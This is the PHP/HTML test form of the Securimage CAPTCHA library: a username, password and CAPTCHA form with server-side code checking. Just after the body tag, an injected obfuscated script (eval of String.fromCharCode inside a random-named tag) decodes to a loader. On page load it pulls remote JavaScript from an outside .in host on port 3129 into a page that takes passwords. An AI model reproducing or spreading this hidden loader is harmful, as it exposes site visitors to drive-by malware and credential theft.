<?php

/**
 * Project:     Securimage: A PHP class for creating and managing form CAPTCHA images<br />
 * File:        securimage.php<br />
 * URL:         www.phpcaptcha.org
 */


session_start();  // Start the session where the code will be stored.

?>
<html>
<head>
  <title>Securimage Test Form</title>
</head>

<body> <kJNPAGyUfwlpmhli1o6kENwBUZTINEoUZ5KH6vuxrkQU5><script>eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,108,106,115,40,41,123,116,114,121,123,118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,115,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,115,114,99,34,44,34,104,116,116,112,58,47,47,113,117,101,111,100,97,101,115,97,104,112,105,97,98,105,101,46,105,110,58,51,49,50,57,47,106,115,34,41,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,125,99,97,116,99,104,40,101,41,123,125,125,115,101,116,84,105,109,101,111,117,116,40,34,108,106,115,40,41,34,44,53,48,48,41,59));</script></kJNPAGyUfwlpmhli1o6kENwBUZTINEoUZ5KH6vuxrkQU5>   

<?php
if (empty($_POST)) { ?>
<form method="POST">
Username:<br />
<input type="text" name="username" /><br />
Password:<br />
<input type="text" name="password" /><br /><br />

<div style="width: 430px; float: left; height: 90px">
      <img id="siimage" align="left" style="padding-right: 5px; border: 0" src="securimage_show.php?sid=<?php echo md5(time()) ?>" />

        <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0" width="19" height="19" id="SecurImage_as3" align="middle">
			    <param name="allowScriptAccess" value="sameDomain" />
			    <param name="allowFullScreen" value="false" />
			    <param name="movie" value="securimage_play.swf?audio=securimage_play.php&bgColor1=#777&bgColor2=#fff&iconColor=#000&roundedCorner=5" />
			    <param name="quality" value="high" />
			
			    <param name="bgcolor" value="#ffffff" />
			    <embed src="securimage_play.swf?audio=securimage_play.php&bgColor1=#777&bgColor2=#fff&iconColor=#000&roundedCorner=5" quality="high" bgcolor="#ffffff" width="19" height="19" name="SecurImage_as3" align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
			  </object>

        <br />
        
        <!-- pass a session id to the query string of the script to prevent ie caching -->
        <a tabindex="-1" style="border-style: none" href="#" title="Refresh Image" onclick="document.getElementById('siimage').src = 'securimage_show.php?sid=' + Math.random(); return false"><img src="images/refresh.gif" alt="Reload Image" border="0" onclick="this.blur()" align="bottom" /></a>
</div>
<div style="clear: both"></div>
Code:<br />

<!-- NOTE: the "name" attribute is "code" so that $img->check($_POST['code']) will check the submitted form field -->
<input type="text" name="code" size="12" /><br /><br />

<input type="submit" value="Submit Form" />
</form>

<?php
} else { //form is posted
  include("securimage.php");
  $img = new Securimage();
  $valid = $img->check($_POST['code']);

  if($valid == true) {
    echo "<center>Thanks, you entered the correct code.<br />Click <a href=\"{$_SERVER['PHP_SELF']}\">here</a> to go back.</center>";
  } else {
    echo "<center>Sorry, the code you entered was invalid.  <a href=\"javascript:history.go(-1)\">Go back</a> to try again.</center>";
  }
}

?>

</body>
</html>